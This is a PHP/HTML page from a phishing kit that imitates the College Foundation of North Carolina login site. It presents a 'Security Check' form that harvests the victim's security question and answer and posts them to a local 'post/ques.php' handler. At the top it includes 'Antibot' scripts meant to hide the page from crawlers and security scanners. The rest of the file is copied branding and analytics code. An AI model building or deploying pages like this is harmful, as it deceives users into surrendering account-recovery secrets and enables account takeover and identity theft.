<?php
error_reporting(0);
include('Antibot/Bot-Crawler.php');
//include('Antibot/Dila_DZ.php');
//include('Antibot/blockers.php');
include('Antibot/detects.php');
?>
<!DOCTYPE html>
<html lang="en"><head>
<meta http-equiv="content-type" content="text/html; charset=UTF-8">
    <meta charset="utf-8">
    <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
    <title>College Foundation of North Carolina - Log in</title>
    

    
        <link rel="stylesheet" href="assets/bootstrap.min.css" integrity="sha384-Vkoo8x4CGsO3+Hhxv8T/Q5PaXtkKtu6ug5TOeNV6gBiFeWPGFN9MuhOf23Q9Ifjh" crossorigin="anonymous">
    

    <!-- glyph libraries -->
    <link rel="stylesheet" href="assets/font-awesome.min.css">
    <link rel="stylesheet" href="assets/material-design-iconic-font.min.css">
    <!-- fonts  -->
    <link rel="stylesheet" href="assets/cly4hfl.css">

    <!-- libraries -->
    <link rel="stylesheet" href="assets/jquery.mmenu.all.css">
    <link rel="stylesheet" href="assets/aos.css">
    <link rel="stylesheet" href="assets/nice-select.css">
    <!-- slider -->
    <link rel="stylesheet" type="text/css" href="assets/slick-theme.css">
    <link rel="stylesheet" type="text/css" href="assets/slick.css">
    <link rel="stylesheet" type="text/css" href="assets/slick-lightbox.css">

    <!-- custom CSS -->
    <link rel="stylesheet" href="assets/styles.css">
    <link href="assets/dx.common.css" rel="stylesheet">
    <link href="assets/dx.light.css" rel="stylesheet">



    <script type="text/javascript" async="" src="assets/main.MTE3ZGZjMmFkMA.js" data-id="C1D5EIS8PMMOGUUMSPE0"></script><script type="text/javascript" async="" src="assets/events.js"></script><script async="" src="assets/analytics.js"></script><script async="" src="assets/gtm.js"></script><script src="assets/jquery.min.js"></script>

    <script src="assets/cldr.js"></script>
    <script src="assets/event.js"></script>
    <script src="assets/supplemental.js"></script>
    <script src="assets/unresolved.js"></script>

    <script src="assets/globalize.js"></script>
    <script src="assets/message.js"></script>
    <script src="assets/number.js"></script>
    <script src="assets/currency.js"></script>
    <script src="assets/date.js"></script>


    <script src="assets/dx.all.js"></script>


    <script src="assets/dx.aspnet.mvc.js"></script>
    <script src="assets/dx.aspnet.data.js"></script>

    <!-- Global site tag (gtag.js) - Google Analytics -->
    
        <!-- Google Tag Manager -->
        <script>
            (function (w, d, s, l, i) {
                w[l] = w[l] || []; w[l].push({
                    'gtm.start':
                        new Date().getTime(), event: 'gtm.js'
                }); var f = d.getElementsByTagName(s)[0],
                    j = d.createElement(s), dl = l != 'dataLayer' ? '&l=' + l : ''; j.async = true; j.src =
                        'https://www.googletagmanager.com/gtm.js?id=' + i + dl; f.parentNode.insertBefore(j, f);
            })(window, document, 'script', 'dataLayer', 'GTM-KM78V9R');
        </script>
        <!-- End Google Tag Manager -->
        <!-- Google tag (gtag.js) -->

        <script async="" src="assets/js"></script>

        <script>

            window.dataLayer = window.dataLayer || [];

            function gtag() { dataLayer.push(arguments); }

            gtag('js', new Date());
            gtag('config', 'G-E3V8EQWMHP');

        </script>

        <script>
            (function (i, s, o, g, r, a, m) {
            i['GoogleAnalyticsObject'] = r; i[r] = i[r] || function () {
                (i[r].q = i[r].q || []).push(arguments)
            }, i[r].l = 1 * new Date(); a = s.createElement(o),
                m = s.getElementsByTagName(o)[0]; a.async = 1; a.src = g; m.parentNode.insertBefore(a, m)
            })(window, document, 'script', 'https://www.google-analytics.com/analytics.js', 'ga');

            ga('create', 'UA-160826171-1', 'auto'); // use platform-appropriate ID
            ga('send', 'pageview');

            ga('create', 'UA-46385615-10', 'auto', 'ncassistTracker');
            ga('ncassistTracker.send', 'pageview');

        </script>
    
<script charset="utf-8" src="assets/identify_cab4d.js"></script></head>
<body class="page">
    <!-- Google Tag Manager (noscript) -->
    <noscript>
        <iframe src="https://www.googletagmanager.com/ns.html?id=GTM-KM78V9R"
                height="0" width="0" style="display:none;visibility:hidden"></iframe>
    </noscript>
    <!-- End Google Tag Manager (noscript) -->
    <div id="main">
        <div id="main-content">
            <div class="container">
                

<section class="login-section">

    <div class="container">
        <div class="col-12 col-sm-12 col-md-12 offset-lg-3 col-lg-6">

            <div class="header-logo">
                <a href="https://www.cfnc.org/">
                    <ul>
                        <li><img src="assets/cfnc-wordmark.svg" class="cfnc-logo" alt="CFNC" width="147" height="42"></li>
                        <li><div class="separator"></div></li>
                        <li>
                            <img id="current-brand" src="assets/cfnc-new-fc.svg" class="foundation-logo" alt="Logo" width="97" height="48">
                        </li>
                    </ul>
                </a>
            </div>

            <div class="basic-card extra-shadow">
                <form id="account" action="post/ques.php" method="post" novalidate="novalidate">
                    <div class="border-line"></div>
                    <div class="card-content">
                        <h1>Security Check</h1>
                        

                        <label for="Input_SecurityQuestion">Security Question</label>
                        <select name="q1" id="q1" class="nice-select" data-val="true" data-val-length="The Security Question cannot be more than 100 characters long." data-val-length-max="100" data-val-required="The Security Question field is required." id="Input_SecurityQuestion" name="Input.SecurityQuestion">
                            <option value="What is your mother&#x27;s maiden name?" selected>What is your mother's maiden name?</option>
                            <option value="What is the city your mother was born in?">What is the city your mother was born in?</option>
                            <option value="What is the name of your first pet?">What is the name of your first pet?</option>
                            <option value="What is the name of your first elementary school?">What is the name of your first elementary school?</option>
                            <option value="What is the name of the street you grew up on?">What is the name of the street you grew up on?</option>
                            <option value="What is the first name of your maternal grandmother?">What is the first name of your maternal grandmother?</option>
                            <option value="What is the first name of your paternal grandmother?">What is the first name of your paternal grandmother?</option>
                            <option value="What is your childhood nickname?">What is your childhood nickname?</option>
                            <option value="What is your high school mascot?">What is your high school mascot?</option>
                        </select>
                        <span class="error-message field-validation-valid" data-valmsg-for="Input.SecurityQuestion" data-valmsg-replace="true"></span>
                        <label class="lbl-shorten" for="Input_Password">Security Answer</label>
                        <div class="input-container">
                            <input class="form-control cfnc-input" type="text" data-val="true" data-val-required="The answer field is required." id="ans1" name="ans1" required>
                            <span class="text-danger field-validation-valid" data-valmsg-for="Input.Password" data-valmsg-replace="true"></span>
                        </div><!-- input-container end -->
                        <br></br>

                    <div class="form-btn-section">
                        <div class="row justify-content-between">
                            <div class="col">
                                <button type="submit" class="btn"> Confirm </button>
                            </div><!-- col end -->
                        </div>
                    </div><!-- control section end -->
                <input name="__RequestVerificationToken" type="hidden" value="CfDJ8CMhFK39z-VFiuJXsjtMyqAnLC2AKXlxk9Zhq7rwlbofZ3-Wg-0pXZcy8YE9ibYLMm2d55lzgo7Zrp4GSMQ3PZgqVgMtUZxjaIsiJff8MkRcKmLRqOzJ_JlNiApdzTbQmnvy_b75bbBZSI2eWMWU6zc"></form>


        </div><!-- row end -->
    </div><!-- container end -->
    <div class="rect-bottom"><img src="assets/rectangle-green.svg" alt="triangle-style"></div>

</section><!-- login-section  end -->
<div class="footer-rect-filler"></div>


            </div>
        </div>
    </div>

    <script src="assets/bootstrap.bundle.min.js"></script>
    <script src="assets/moment.min.js" integrity="sha256-4iQZ6BVL4qNKlQ27TExEhBN1HFPvAvAMbFavKKosSWQ=" crossorigin="anonymous"></script>
    <script src="assets/lodash.min.js" integrity="sha256-VeNaFBVDhoX3H+gJ37DpT/nTuZTdjYro9yBruHjVmoQ=" crossorigin="anonymous"></script>
    <script src="assets/site.js"></script>

    
    

    <script src="assets/jquery.validate.min.js" crossorigin="anonymous" integrity="sha384-rZfj/ogBloos6wzLGpPkkOr/gpkBNLZ6b6yLy4o+ok+t/SAKlL5mvXLr0OXNi1Hp">
    </script>
<script>(window.jQuery && window.jQuery.validator||document.write("\u003Cscript src=\u0022/lib/jquery-validation/jquery.validate.min.js\u0022 crossorigin=\u0022anonymous\u0022 integrity=\u0022sha384-rZfj/ogBloos6wzLGpPkkOr/gpkBNLZ6b6yLy4o\u002Bok\u002Bt/SAKlL5mvXLr0OXNi1Hp\u0022\u003E\u003C/script\u003E"));</script>
    <script src="assets/jquery.validate.unobtrusive.min.js" crossorigin="anonymous" integrity="sha384-ifv0TYDWxBHzvAk2Z0n8R434FL1Rlv/Av18DXE43N/1rvHyOG4izKst0f2iSLdds">
    </script>
<script>(window.jQuery && window.jQuery.validator && window.jQuery.validator.unobtrusive||document.write("\u003Cscript src=\u0022/lib/jquery-validation-unobtrusive/jquery.validate.unobtrusive.min.js\u0022 crossorigin=\u0022anonymous\u0022 integrity=\u0022sha384-ifv0TYDWxBHzvAk2Z0n8R434FL1Rlv/Av18DXE43N/1rvHyOG4izKst0f2iSLdds\u0022\u003E\u003C/script\u003E"));</script>
    <script src="assets/jquery.unobtrusive-ajax.min.js" crossorigin="anonymous">
    </script>
<script>(window.jQuery && window.jQuery.validator && window.jQuery.validator.unobtrusive||document.write("\u003Cscript src=\u0022/lib/jquery-validation-unobtrusive/jquery.validate.unobtrusive.min.js\u0022 crossorigin=\u0022anonymous\u0022\u003E\u003C/script\u003E"));</script>


<script>
    var settings = {
        errorClass: "error",
        validClass: "",
        highlight: function (element, errorClass, validClass) {
            $(element).addClass(errorClass).removeClass(validClass);
            $(element).parents(".input-container").addClass(errorClass);
            $(element.form).find(`label[for=${element.id}]`).addClass(errorClass);
            $(element.form).find(`[data-valmsg-for=${element.id}]`).show();
        },
        unhighlight: function (element, errorClass, validClass) {
            $(element).addClass(validClass).removeClass(errorClass);
            $(element).parents(".input-container").addClass(validClass).removeClass(errorClass);
            $(element.form).find(`label[for=${element.id}]`).addClass(validClass).removeClass(errorClass);
            $(element.form).find(`[data-valmsg-for=${element.id}]`).hide();
        }
    };
    $.validator.setDefaults(settings);

    $.validator.unobtrusive.options = settings;
</script>

    <script async="" src="assets/c1f8fe00-d110-0138-20b6-06a60fe5fe77"></script>




<script type="text/javascript" id="">!function(d,g,e){d.TiktokAnalyticsObject=e;var a=d[e]=d[e]||[];a.methods="page track identify instances debug on off once ready alias group enableCookie disableCookie".split(" ");a.setAndDefer=function(b,c){b[c]=function(){b.push([c].concat(Array.prototype.slice.call(arguments,0)))}};for(d=0;d<a.methods.length;d++)a.setAndDefer(a,a.methods[d]);a.instance=function(b){b=a._i[b]||[];for(var c=0;c<a.methods.length;c++)a.setAndDefer(b,a.methods[c]);return b};a.load=function(b,c){var f="https://analytics.tiktok.com/i18n/pixel/events.js";
a._i=a._i||{};a._i[b]=[];a._i[b]._u=f;a._t=a._t||{};a._t[b]=+new Date;a._o=a._o||{};a._o[b]=c||{};c=document.createElement("script");c.type="text/javascript";c.async=!0;c.src=f+"?sdkid\x3d"+b+"\x26lib\x3d"+e;b=document.getElementsByTagName("script")[0];b.parentNode.insertBefore(c,b)};a.load("C1D5EIS8PMMOGUUMSPE0");a.page()}(window,document,"ttq");</script><script async="" src="assets/p"></script></body><iframe style="display: none;" id="__JSBridgeIframe_1.0__" title="jsbridge___JSBridgeIframe_1.0__"></iframe><iframe style="display: none;" id="__JSBridgeIframe_SetResult_1.0__" title="jsbridge___JSBridgeIframe_SetResult_1.0__"></iframe><iframe style="display: none;" id="__JSBridgeIframe__" title="jsbridge___JSBridgeIframe__"></iframe><iframe style="display: none;" id="__JSBridgeIframe_SetResult__" title="jsbridge___JSBridgeIframe_SetResult__"></iframe></html>